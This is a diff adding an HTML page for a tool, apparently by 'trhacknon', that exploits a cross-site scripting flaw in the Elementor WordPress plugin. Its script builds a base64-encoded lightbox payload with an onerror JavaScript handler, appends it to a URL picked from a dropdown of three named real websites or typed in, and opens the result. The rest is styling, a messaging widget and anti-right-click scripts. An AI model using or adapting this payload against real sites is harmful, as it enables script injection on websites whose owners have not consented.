@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <!-- Required meta tags -->
+  <link rel="icon" href="{{ url_for('static', filename='hack.ico') }}" type="image/x-icon">
+    <meta charset="utf-8"/>
+    <meta name="viewport"
+          content="width=device-width,
+        initial-scale=1"/>
+
+    <!-- SEO Meta Tags -->
+    <meta name="keywords" content="XSS, Elementor, vérification, sécurité, trhacknon"/>
+    <meta name="description" content="Vérification de la présence d'Elementor WordPress sur le site par trhacknon"/>
+
+    <!-- Open Graph Meta Tags (pour Facebook) -->
+    <meta property="og:title" content="Vérification XSS Elementor par trhacknon"/>
+    <meta property="og:description" content="Vérification de la présence d'Elementor WordPress sur le site par trhacknon"/>
+    <meta property="og:image" content="https://l.top4top.io/p_2822tc1xv0.jpg"/>
+    <meta property="og:url" content="https://elemfind-1-q3343570.deta.app"/>
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:title" content="Vérification XSS Elementor par trhacknon"/>
+    <meta name="twitter:description" content="Vérification de la présence d'Elementor WordPress sur le site par trhacknon"/>
+    <meta name="twitter:image" content="https://l.top4top.io/p_2822tc1xv0.jpg"/>
+    <meta name="twitter:url" content="https://elemfind-1-q3343570.deta.app"/>
+
+    <!-- Autres balises meta utiles -->
+    <meta name="author" content="trhacknon"/>
+    <meta name="robots" content="index, follow"/>
+    
+
+    <!-- Bootstrap CSS -->
+    <link
+            href=
+                    "https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css"
+            rel="stylesheet"
+            integrity=
+                    "sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl"
+            crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"/>
+    <link
+            href=
+                    "https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"
+            rel="stylesheet"
+    /> 
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+    <script type="text/javascript">
+        const jspayload = "alert('xss by trhacknon')";
+        const base64 = btoa(JSON.stringify({
+            "type": "video",
+            "url": "http://",
+            "videoType": "hosted",
+            "videoParams": {
+                "onerror": jspayload,
+                "style": "    background-color: white;" +
+                    "background-image: url(https://nerdist.com/wp-content/uploads/2020/07/maxresdefault.jpg);" +
+                    "background-size: contain;"
+            }
+        }))
+
+        const payload = '/#elementor-action:action=lightbox&settings=' + base64;
+
+        $(function () {
+            $("#website").val(location.hash.substr(1))
+        });
+
+        function checkSite() {
+            let selectedWebsite = $("#websiteSelector").val(); // Récupérer la valeur de la liste déroulante
+            if (!selectedWebsite) {
+                selectedWebsite = $("#website").val(); // Si la liste déroulante est vide, récupérer la valeur de l'input text
+            }
+
+            if (!/^https?:\/\//i.test(selectedWebsite)) {
+                selectedWebsite = 'https://' + selectedWebsite;
+            }
+            selectedWebsite = selectedWebsite + payload;
+
+            window.open(selectedWebsite, '_blank');
+        }
+    </script>
+
+    <title>Elementor Xss Test</title>
+</head>
+<body>
+<span class="rainbow-text-loop">TRHACKNON tester for xss cve CVE elementor WordPress. Rainbow hat </span><br>
+<section id="navbar">
+    <nav class="navbar navbar-expand-lg navbar-light">
+        <div class="container-fluid" style="justify-content: center">
+            <a class="navbar-brand animate__animated animate__bounce" href="#">
+                All your Elementor are belong to us
+            </a>
+        </div>
+    </nav>
+</section>
+
+<!-- banner -->
+<section id="banner">
+    <div class="container-fluid" id="banner-container">
+        <div class="row" id="banner-row">
+            <div class="col-md-12" id="banner-col">
+                <div class="input-group mb-3 animate__animated animate__fadeIn">
+                    <div class="input-group-prepend">
+                        <label class="input-group-text" for="websiteSelector">Choose a website</label>
+                    </div>
+                    <select class="form-select" id="websiteSelector">
+                        <option value="https://aello.gr">https://aello.gr</option>
+                        <option value="https://ailesburywebdesign.ie">https://ailesburywebdesign.ie</option>
+                        <option value="https://qanon-france.com">https://qanon-france.com</option>
+                    </select>
+                    <input type="text" class="form-control" placeholder="Or enter a website" aria-label="website" aria-describedby="basic-addon1" id="website"/>
+                    <button onclick="checkSite()" type="button" class="btn btn-danger animate__animated animate__pulse">Check</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- footer -->
+<section id="footer">
+    <section id="banner">
+        <div class="container-fluid" id="banner-container">
+            <div class="row" id="banner-row">
+                <div class="col-md-12" id="footer-col1">
+                    <h3 style="text-decoration: underline;">Brought to you by</h3>
+                    <p>
+                        Trhacknon Bar - @Trhacknon Security
+                    </p>
+                    <p>
+                        anonymous - rainbow hat
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+</section>
+
+<!-- Optional JavaScript; choose one of the two! -->
+
+<!-- Option 1: Bootstrap Bundle with Popper -->
+<script
+        src=
+        "https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"
+        integrity=
+        "sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0"
+        crossorigin="anonymous"
+></script>
+<!-- GetButton.io widget -->
+<script type="text/javascript">
+(function () {
+var options = {
+telegram: "trknfriendsBot", // Telegram bot username
+telegram_color: "#129BF4", // Telegram button color
+whatsapp: "+18056009130", // WhatsApp number
+call_to_action: "Im trhacknon message me if you want", // Call to action
+button_color: "#E74339", // Color of button
+position: "right", // Position may be 'right' or 'left'
+order: "telegram,whatsapp", // Order of buttons
+pre_filled_message: "trhacknon replit project", // WhatsApp pre-filled message
+};
+var proto = 'https:', host = "getbutton.io", url = proto + '//static.' + host;
+var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
+s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
+var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
+})();
+</script>
+<!-- /GetButton.io widget -->
+<script type='text/javascript'>
+//<![CDATA[
+// Anti Klik Kanan
+var message="pas toucher ! T'as pas le droit";function clickIE4(){if(2==event.button)return alert(message),!1}function clickNS4(e){if((document.layers||document.getElementById&&!document.all)&&(2==e.which||3==e.which))return alert(message),!1}document.layers?(document.captureEvents(Event.MOUSEDOWN),document.onmousedown=clickNS4):document.all&&!document.getElementById&&(document.onmousedown=clickIE4),document.oncontextmenu=new Function("alert(message);return false");
+//]]>
+</script>
+
+<body onLoad="LoadFunctions()">
+<script language="Javascript">
+var msg="Ngotak sendiri cok jan copas";
+function rtclickcheck(keyp){
+if(navigator.appName == "Netscape" && keyp.which == 3){
+alert(msg);
+return false;
+if (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2) {
+alert(msg);
+return false;
+}
+}
+document.onmousedown=rtclickcheck
+</script>
+<script>
+setInterval(function(){
+$(".berkedip").toggle();
+},300);
+</script>
+<center><a href="https://www.wieistmeineip.de/cometo/?en"><img src="https://www.wieistmeineip.de/ip-address/?size=468x60" border="3" width="470" height="60" alt="IP"></a></center>
+  
+</body>
+</html>
